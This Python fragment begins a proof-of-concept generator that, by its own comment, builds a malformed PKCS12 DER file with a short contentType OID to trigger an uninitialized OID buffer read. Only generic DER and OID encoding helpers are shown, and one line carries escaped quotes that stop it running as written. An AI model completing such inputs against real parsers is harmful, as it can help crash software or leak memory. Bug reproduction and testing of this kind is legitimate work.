import struct

# Build a minimal PKCS12 DER with short contentType OID
# to trigger uninitialized OID buffer read

def encode_oid_bytes(dotted):
    # encode OID to DER bytes
    parts = list(map(int, dotted.split(\".\")))
    result = [40*parts[0]+parts[1]]
    for p in parts[2:]:
        if p == 0:
            result.append(0)
        else:
            enc = []
            while p:
                enc.append(p & 0x7f)
                p >>= 7
            enc.reverse()
            for i,b in enumerate(enc):
                if i < len(enc)-1:
                    result.append(b | 0x80)
                else:
                    result.append(b)
    return bytes(result)

def der_len(n):
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    else:
        return bytes([0x82, (n>>8)&0xff, n&0xff])

def tlv(tag, content):
    return bytes([tag]) + der_len(len(content)) + content

